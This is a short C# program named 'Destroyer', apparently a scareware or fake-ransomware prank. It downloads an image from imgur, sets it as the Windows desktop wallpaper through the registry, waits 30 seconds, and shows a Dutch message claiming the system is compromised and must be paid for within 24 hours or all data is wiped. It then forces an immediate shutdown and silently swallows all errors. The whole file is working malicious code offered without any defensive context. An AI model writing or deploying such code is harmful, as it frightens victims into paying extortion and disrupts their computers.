using System;
using System.IO;
using System.Threading;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace Destroyer
{
    class Program
    {
        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type);

        [DllImport("user32.dll")]
        static extern bool SystemParametersInfo(uint uiAction, uint uiParam, string pvParam, uint fWinIni);

        static void Main()
        {
            try
            {
                string img = Path.Combine(Environment.GetEnvironmentVariable("TEMP"), "bg.jpg");
                new System.Net.WebClient().DownloadFile("https://i.imgur.com/deOMvCU.jpeg", img);
                Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true)?.SetValue("Wallpaper", img);
                SystemParametersInfo(20, 0, img, 0x01 | 0x02);
                Thread.Sleep(30000);
                MessageBox(IntPtr.Zero, "Je systeem is gecompromitteerd. Betaal binnen 24 uur of alles wordt gewist.", "WAARSCHUWING", 0x10);
                System.Diagnostics.Process.Start("shutdown", "/s /f /t 0");
            }
            catch { }
        }
    }
}
